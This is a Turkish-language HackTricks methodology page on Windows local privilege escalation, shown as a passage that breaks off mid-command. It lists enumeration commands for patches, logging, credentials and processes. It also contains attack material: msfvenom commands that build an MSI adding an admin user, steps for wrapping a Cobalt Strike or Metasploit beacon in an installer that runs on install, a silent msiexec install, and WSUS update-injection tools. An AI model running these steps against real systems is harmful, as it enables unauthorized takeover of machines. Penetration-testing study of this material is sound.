# Windows Yerel İzin Yükseltme

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>

### **Windows yerel izin yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## İlk Windows Teorisi

### Erişim Jetonları

**Windows Erişim Jetonları hakkında bilgi sahibi değilseniz, devam etmeden önce aşağıdaki sayfayı okuyun:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Bütünlük Seviyeleri

**Windows'ta bütünlük seviyeleri hakkında bilgi sahibi değilseniz, devam etmeden önce aşağıdaki sayfayı okuyun:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows Güvenlik Kontrolleri

Windows'ta, sistemi **numaralandırmaktan**, yürütülebilir dosyaları çalıştırmaktan veya hatta **etkinliklerinizi tespit etmekten** engelleyebilecek farklı şeyler vardır. İzin yükseltme numaralandırmasına başlamadan önce, aşağıdaki sayfayı **okuyun** ve tüm bu **savunma mekanizmalarını** **numaralandırın**:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Sistem Bilgisi

### Sürüm bilgisi numaralandırması

Windows sürümünün herhangi bir bilinen zafiyeti olup olmadığını kontrol edin (ayrıca uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploitleri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında detaylı bilgi aramak için kullanışlıdır. Bu veritabanı, Windows ortamının sunmuş olduğu **büyük saldırı yüzeyini** gösteren 4.700'den fazla güvenlik açığı içermektedir.

**Sistem üzerinde**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas, watson gömülüdür)_

**Sistem bilgileriyle yerel olarak**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploitlerin Github depoları:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kaydedilmiş herhangi bir kimlik bilgisi/juicy bilgi var mı?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell Geçmişi

PowerShell, bir komut satırı arayüzü ve betik dili olarak kullanılan bir Microsoft Windows aracıdır. PowerShell, kullanıcıların komutları ve betikleri otomatik olarak çalıştırmasına olanak tanır ve bu da bir saldırganın hedef sisteme erişimini artırabilir. Bu nedenle, PowerShell geçmişi, bir saldırganın hedef sistemi keşfetmek ve saldırılarını gizlemek için kullanabileceği önemli bir bilgidir.

PowerShell geçmişi, kullanıcının yaptığı PowerShell komutlarının bir kaydını tutar. Bu kayıtlar, kullanıcının geçmişte hangi komutları çalıştırdığını ve hangi parametreleri kullandığını gösterir. Bir saldırgan, PowerShell geçmişini inceleyerek hedef sistemi daha iyi anlayabilir ve saldırılarını planlayabilir.

PowerShell geçmişi, varsayılan olarak etkinleştirilmiştir ve kullanıcıların geçmişlerini görüntülemelerine ve yönetmelerine olanak tanır. Ancak, bir saldırgan, hedef sisteme erişim sağladığında PowerShell geçmişini manipüle edebilir veya silerek izlerini gizleyebilir. Bu nedenle, bir sistem yöneticisi veya güvenlik uzmanı, PowerShell geçmişini düzenli olarak kontrol etmeli ve şüpheli etkinlikleri tespit etmek için izleri analiz etmelidir.

PowerShell geçmişi, aşağıdaki komutlarla yönetilebilir:

- `Get-History`: Geçmişte çalıştırılan PowerShell komutlarını listeler.
- `Clear-History`: Geçmişteki tüm PowerShell komutlarını temizler.
- `Remove-History`: Belirli bir PowerShell komutunu geçmişten kaldırır.

PowerShell geçmişi, bir saldırganın hedef sistemi keşfetmesini ve saldırılarını gizlemesini kolaylaştırabilir. Bu nedenle, bir sistem yöneticisi veya güvenlik uzmanı, PowerShell geçmişini düzenli olarak kontrol etmeli ve şüpheli etkinlikleri tespit etmek için izleri analiz etmelidir.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkript Dosyaları

Bunu nasıl açacağınızı öğrenmek için [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresine bakabilirsiniz.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Modül Günlüğü

PowerShell boru hattı yürütmelerinin ayrıntıları kaydedilir ve yürütülen komutları, komut çağrılarını ve betiklerin bazı bölümlerini kapsar. Bununla birlikte, tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için, belgelerin "Transkript dosyaları" bölümündeki talimatları izleyin ve **"Powershell Transcription"** yerine **"Modül Günlüğü"** seçeneğini tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerinden son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Komut Bloğu Kaydı**

Komutun yürütülmesiyle ilgili tüm etkinlikler ve içeriklerin tam kaydı alınır, böylece her kod bloğu çalıştırıldığı anda belgelenir. Bu süreç, her bir etkinliğin kapsamlı bir denetim izini oluşturarak, adli bilişim ve zararlı davranış analizi için değerli bir kaynak sağlar. Yürütme anında tüm etkinliklerin belgelenmesi sayesinde, süreçle ilgili detaylı bilgiler sunulur.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için günlük olaylar, Windows Olay Görüntüleyici'de şu yol üzerinde bulunabilir: **Uygulama ve Hizmet Günlükleri > Microsoft > Windows > PowerShell > Operasyonel**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları

#### İnternet Explorer

İnternet Explorer'ın güvenlik ayarlarını kontrol etmek için aşağıdaki adımları izleyin:

1. İnternet Explorer'ı açın.
2. Üst menü çubuğunda "Araçlar" seçeneğine tıklayın.
3. Açılan menüden "İnternet Seçenekleri"ni seçin.
4. "Güvenlik" sekmesine tıklayın.
5. Güvenlik seviyesini ayarlamak istediğiniz bölgeyi seçin (İnternet, Yerel intranet, Güvenilen siteler veya Kısıtlı siteler).
6. Seçtiğiniz bölge için güvenlik düzeyini ayarlayın.
7. Ayarları uygulamak için "Tamam" düğmesine tıklayın.

#### Firefox

Firefox'un güvenlik ayarlarını kontrol etmek için aşağıdaki adımları izleyin:

1. Firefox'u açın.
2. Üst menü çubuğunda "Araçlar" seçeneğine tıklayın.
3. Açılan menüden "Seçenekler"i seçin.
4. "Gizlilik ve Güvenlik" sekmesine tıklayın.
5. "Gelişmiş" bölümüne gidin.
6. "Ağ" sekmesine tıklayın.
7. İstediğiniz ağ ayarlarını yapılandırın.
8. Ayarları uygulamak için "Tamam" düğmesine tıklayın.

#### Chrome

Chrome'un güvenlik ayarlarını kontrol etmek için aşağıdaki adımları izleyin:

1. Chrome'u açın.
2. Sağ üst köşedeki üç noktaya tıklayın.
3. Açılan menüden "Ayarlar"ı seçin.
4. Sayfanın en altına gidin ve "Gelişmiş"i tıklayın.
5. "Gizlilik ve güvenlik" bölümüne gidin.
6. İstediğiniz güvenlik ayarlarını yapılandırın.
7. Ayarları uygulamak için "Tamam" düğmesine tıklayın.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sistem, güncellemelerin http**S** yerine http kullanılarak istenip istenmediğini kontrol ederek tehlikeye atılabilir.

Aşağıdaki komutu çalıştırarak ağın SSL olmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol edebilirsiniz:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Eğer şöyle bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` değeri `1` ise.

O zaman, **sömürülebilir**. Eğer son kayıt 0'a eşitse, WSUS girişi yok sayılacaktır.

Bu zafiyetleri sömürmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz - Bunlar, 'sahte' güncellemeleri SSL olmayan WSUS trafiğine enjekte etmek için kullanılan araçlardır.

Araştırmayı buradan okuyabilirsiniz:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Tam raporu buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temel olarak, bu hata tarafından sömürülen açık şudur:

> Eğer yerel kullanıcı proxy'sini değiştirme yetkimiz varsa ve Windows Güncellemeleri, Internet Explorer'ın ayarlarında yapılandırılan proxy'i kullanıyorsa, bu durumda [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırarak kendi trafiğimizi yakalayabilir ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullanırken, sertifika deposunu da kullanır. WSUS ana bilgisayar adı için bir öz imzalı sertifika oluşturup bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifikayı kullanıcı tarafından güvenilir olarak kabul edilirse ve doğru ana bilgisayar adına sahipse, sertifikayı kabul edecektir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracını kullanarak sömürebilirsiniz (serbest bırakıldığında).

## KrbRelayUp

Belirli koşullar altında Windows **etki alanı** ortamlarında bir **yerel ayrıcalık yükseltme** zafiyeti bulunmaktadır. Bu koşullar, **LDAP imzalamasının zorunlu olmadığı** ortamları, kullanıcıların **Kaynak Tabanlı Kısıtlı Delege (RBCD)** yapılandırmasına izin veren öz haklara sahip olmalarını ve kullanıcıların etki alanında bilgisayar oluşturabilme yeteneğini içerir. Bu **gereksinimlerin** varsayılan ayarlar kullanılarak karşılandığını belirtmek önemlidir.

Sömürüyü [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde bulabilirsiniz.

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) adresini kontrol edin.

## AlwaysInstallElevated

Eğer bu 2 kayıt **etkinleştirilmişse** (değer **0x1** ise), herhangi bir ayrıcalığa sahip kullanıcılar NT AUTHORITY\\**SYSTEM** olarak `*.msi` dosyalarını **yükleme** (çalıştırma) yetkisine sahip olacaktır.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit yükleri

Metasploit, bir hedef sisteme erişim sağlamak ve hedef sistemdeki zayıflıkları sömürmek için kullanılan birçok farklı payload sunar. Payload'lar, hedef sisteme zararlı kod enjekte etmek ve hedef sistemdeki ayrıcalıkları yükseltmek için kullanılır.

Metasploit, çeşitli payload türleri sunar. İşletim sistemine, hedefe ve kullanılacak saldırı yöntemine bağlı olarak uygun bir payload seçmek önemlidir. İşte bazı yaygın Metasploit payload türleri:

- **Meterpreter**: Bu payload, hedef sistemde tam bir komut ve kontrol kabiliyeti sağlar. Hedef sistemdeki dosyaları okuma/yazma, ekran görüntüsü alma, webcam ve mikrofonu kontrol etme gibi birçok yeteneği vardır.

- **Shell**: Bu payload, hedef sistemde bir komut kabuğu açar ve saldırganın komutları doğrudan hedef sistemde çalıştırmasını sağlar.

- **VNC**: Bu payload, hedef sistemde bir VNC sunucusu başlatır ve saldırganın hedef sistemdeki ekranı görüntülemesine olanak tanır.

- **Reverse TCP**: Bu payload, hedef sistemden saldırganın belirlediği bir IP adresine ve port numarasına bağlantı kurmasını sağlar. Bu, saldırganın hedef sistemdeki ayrıcalıkları yükseltmek için bir komut kabuğu açmasına olanak tanır.

- **Bind TCP**: Bu payload, saldırganın belirlediği bir IP adresi ve port numarasında bir dinleme noktası oluşturur ve hedef sistemden gelen bağlantıları kabul eder. Bu, saldırganın hedef sistemdeki ayrıcalıkları yükseltmek için bir komut kabuğu açmasına olanak tanır.

Metasploit, bu ve diğer birçok payload türü sunar. Saldırı senaryonuza ve hedef sistem özelliklerine bağlı olarak uygun bir payload seçmek önemlidir.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa, **`exploit/windows/local/always_install_elevated`** modülünü kullanarak bu tekniği otomatikleştirebilirsiniz.

### PowerUP

Power-up'dan `Write-UserAddMSI` komutunu kullanarak ayrıcalıkları yükseltmek için mevcut dizine bir Windows MSI ikili dosyası oluşturun. Bu komut dosyası, bir kullanıcı/grup eklemesi için bir MSI yükleyicisi oluşturur ve kullanıcı arayüzü erişimi gerektirir:
```
Write-UserAddMSI
```
Yüksek ayrıcalıklara erişmek için oluşturulan ikili dosyayı çalıştırın.

### MSI Sarmalayıcı

Bu araçları kullanarak bir MSI sarmalayıcı nasıl oluşturulacağını öğrenmek için bu öğreticiyi okuyun. Sadece komut satırlarını çalıştırmak istiyorsanız, bir "**.bat**" dosyasını sarmalayabilirsiniz.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX ile MSI Oluşturma

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio ile MSI Oluşturma

* Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda yeni bir Windows EXE TCP yükü oluşturun.
* **Visual Studio**'yu açın, **Yeni bir proje oluşturun** seçeneğini seçin ve arama kutusuna "installer" yazın. **Kurulum Sihirbazı** projesini seçin ve **İleri**'ye tıklayın.
* Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`**'yi kullanın, **çözümü ve projeyi aynı dizine yerleştir** seçeneğini seçin ve **Oluştur**'a tıklayın.
* **İleri**'ye tıklayarak 4 adımlı işlemde 3. adıma gelene kadar devam edin (dahil edilecek dosyaları seçin). **Ekle**'ye tıklayın ve yeni oluşturduğunuz Beacon yükünü seçin. Ardından **Tamam**'a tıklayın.
* **Çözüm Gezgini**'nde **AlwaysPrivesc** projesini vurgulayın ve **Özellikler**'de **Hedef Platform**'u **x86** yerine **x64** olarak değiştirin.
* Kurulan uygulamanın daha gerçekçi görünmesini sağlayabilecek **Yazar** ve **Üretici** gibi diğer özellikleri değiştirebilirsiniz.
* Projeye sağ tıklayın ve **Görünüm > Özel Eylemler**'i seçin.
* **Yükle**'ye sağ tıklayın ve **Özel Eylem Ekle**'yi seçin.
* **Uygulama Klasörü** üzerine çift tıklayın, **beacon.exe** dosyanızı seçin ve **Tamam**'a tıklayın. Bu, kurulum çalıştırıldığında beacon yükünün hemen çalıştırılmasını sağlar.
* **Özel Eylem Özellikleri**'nde **Run64Bit**'i **True** olarak değiştirin.
* Son olarak, **derleyin**.
* Eğer `Dosya 'beacon-tcp.exe', hedef platformu 'x86' olan projenin hedef platformuyla uyumlu değil` uyarısı görüntülenirse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü niyetli `.msi` dosyasının **arkaplanda** **kurulumunu** gerçekleştirmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti sömürmek için şunu kullanabilirsiniz: _exploit/windows/local/always\_install\_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar, neyin **günlüğe kaydedildiğini** belirler, bu yüzden dikkat etmelisiniz.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, logların nereye gönderildiğini bilmek açısından ilginçtir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, yerel Yönetici parolalarının yönetimi için tasarlanmıştır ve bir etki alanına katılan bilgisayarlarda her parolanın benzersiz, rastgele ve düzenli olarak güncellenmesini sağlar. Bu parolalar, Active Directory içinde güvenli bir şekilde depolanır ve yalnızca yetkilendirilmiş kullanıcılar tarafından ACL'ler aracılığıyla yeterli izin verilenlerin yerel yönetici parolalarını görüntülemelerine izin verilir.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Etkin olduğunda, **düz metin parolaları LSASS** (Yerel Güvenlik Otoritesi Alt Sistemi Hizmeti) içinde depolanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Koruma

**Windows 8.1** ile başlayarak, Microsoft, yerel güvenlik otoritesi (LSA) için geliştirilmiş koruma sağladı. Bu koruma, güvenilmeyen işlemlerin belleğini okuma veya kod enjekte etme girişimlerini **engellemek** ve sistem güvenliğini daha da artırmak için tasarlanmıştır.\
[**LSA Koruma hakkında daha fazla bilgi için buraya tıklayın**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Kimlik Bilgileri Koruma

**Kimlik Bilgileri Koruma**, **Windows 10**'da tanıtıldı. Amacı, bir cihazda depolanan kimlik bilgilerini, hash geçişi saldırıları gibi tehditlere karşı korumaktır.|
[**Kimlik Bilgileri Koruma hakkında daha fazla bilgi burada.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Önbelleğe Alınmış Kimlik Bilgileri

**Etki Alanı kimlik bilgileri**, yerel güvenlik otoritesi (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri, kayıtlı bir güvenlik paketi tarafından doğrulandığında, genellikle kullanıcı için etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Sorgulama

Sahip olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bir ayrıcalıklı gruba ait iseniz, ayrıcalıkları yükseltmek için bunları kullanabilirsiniz**. Ayrıcalıklı gruplar hakkında bilgi edinin ve ayrıcalıkları yükseltmek için nasıl istismar edileceğini buradan öğrenin:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipülasyonu

Bir **token**'ın ne olduğu hakkında daha fazla bilgi edinmek için bu sayfaya göz atın: [**Windows Tokenleri**](../authentication-credentials-uac-and-efs.md#access-tokens).\
İlginç tokenler hakkında ve bunları nasıl istismar edeceğiniz hakkında bilgi edinmek için aşağıdaki sayfayı kontrol edin:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev Dizinleri

Home dizinleri, kullanıcıların kişisel dosyalarını ve ayarlarını sakladıkları yerlerdir. Windows işletim sisteminde, her kullanıcı için ayrı bir ev dizini bulunur. Bu dizinler, kullanıcı adlarıyla ilişkilendirilir ve genellikle `C:\Users` dizini altında bulunur.

Ev dizinleri, kullanıcıların özel verilerini ve yapılandırmalarını içerdiği için, bir saldırgan için değerli hedefler olabilir. Bu nedenle, ev dizinlerinin güvenliğini sağlamak önemlidir.

Ev dizinlerinin güvenliğini artırmak için aşağıdaki adımları izleyebilirsiniz:

1. **Kullanıcı İzinleri**: Ev dizinlerinin kullanıcılar dışında erişimini sınırlamak için doğru kullanıcı izinlerini ayarlayın. Kullanıcılar, kendi ev dizinlerine tam erişime sahip olmalı, ancak diğer kullanıcıların erişimini sınırlamalısınız.

2. **Gizli Dosyalar**: Ev dizinlerindeki önemli dosyaları gizlemek için dosya ve klasörlerin gizli olarak işaretlenmesini sağlayın. Bu, saldırganların ev dizinlerindeki dosyaları kolayca bulmasını engelleyecektir.

3. **Güçlü Parolalar**: Kullanıcıların ev dizinlerine erişmek için güçlü parolalar kullanmasını sağlayın. Zayıf veya tahmin edilebilir parolalar, saldırganların ev dizinlerine kolayca erişmesine olanak tanır.

4. **Dosya Şifreleme**: Hassas verileri içeren dosyaları şifreleyerek ev dizinlerinin güvenliğini artırabilirsiniz. Bu, saldırganların şifresiz dosyalara erişmesini engelleyecektir.

Ev dizinlerinin güvenliğini sağlamak, kullanıcıların kişisel verilerini ve yapılandırmalarını korumak için önemlidir. Bu adımları izleyerek ev dizinlerinin güvenliğini artırabilir ve saldırılara karşı daha iyi korunabilirsiniz.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası

Windows işletim sistemlerinde, parola politikası, kullanıcıların parolalarının güvenliğini sağlamak için belirli kurallar ve kısıtlamalar içeren bir dizi politikadır. Bu politikalar, parolaların karmaşıklığını artırarak, parola değişikliği sıklığını zorunlu kılarak ve parola geçmişini kontrol ederek güvenlik düzeyini artırır.

Parola politikası aşağıdaki unsurları içerebilir:

- Minimum parola uzunluğu: Kullanıcıların belirli bir uzunlukta parola seçmeleri gerekmektedir.
- Karmaşıklık gereksinimleri: Parolaların büyük harf, küçük harf, rakam ve özel karakterler içermesi gerekmektedir.
- Parola değişikliği sıklığı: Kullanıcıların belirli bir süre sonra parolalarını değiştirmeleri gerekmektedir.
- Parola geçmişi: Kullanıcılar, belirli bir süre boyunca aynı parolayı kullanamazlar.
- Hesap kilitleme: Belirli bir sayıda başarısız parola denemesinden sonra hesap otomatik olarak kilitlenebilir.

Parola politikası, kullanıcıların güçlü ve güvenli parolalar kullanmalarını teşvik ederek, potansiyel saldırılara karşı koruma sağlar.
```bash
net accounts
```
### Pano İçeriğini Almak

Bir saldırgan olarak, hedef sistemdeki panonun içeriğini almak, kullanıcıların panoya kopyaladıkları verilere erişmek için yararlı olabilir. Bu, hassas bilgilerin ele geçirilmesi veya kullanıcıların kimlik bilgilerinin ortaya çıkarılması için bir fırsat sunabilir.

Windows işletim sistemlerinde, panonun içeriğini almak için aşağıdaki adımları izleyebilirsiniz:

1. `OpenClipboard` fonksiyonunu kullanarak panoyu açın.
2. `GetClipboardData` fonksiyonunu kullanarak panonun veri biçimini belirleyin.
3. Veri biçimine göre, `GlobalLock` fonksiyonunu kullanarak veriye erişin.
4. Veriyi kullanın veya kaydedin.
5. `GlobalUnlock` fonksiyonunu kullanarak veri kilidini açın.
6. `CloseClipboard` fonksiyonunu kullanarak panoyu kapatın.

Bu adımları takip ederek, hedef sistemin panosundaki verilere erişebilir ve bu bilgileri kullanabilirsiniz. Ancak, bu işlemi gerçekleştirmek için yönetici ayrıcalıklarına ihtiyacınız olabilir.
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

İlk olarak, işlemleri listelemek için **işlemin komut satırında şifreleri kontrol edin**.\
Eğer mümkünse, **çalışan bazı ikili dosyaları üzerine yazabilirsiniz** veya ikili dosya klasörüne yazma izniniz varsa, olası [**DLL Hijacking saldırılarını**](dll-hijacking.md) kullanarak zafiyetleri sömürün.
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman mümkün olan [**electron/cef/chromium hata ayıklayıcılarının** çalıştığını kontrol edin, ayrıcalıkları yükseltmek için bunu kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**İşlem ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
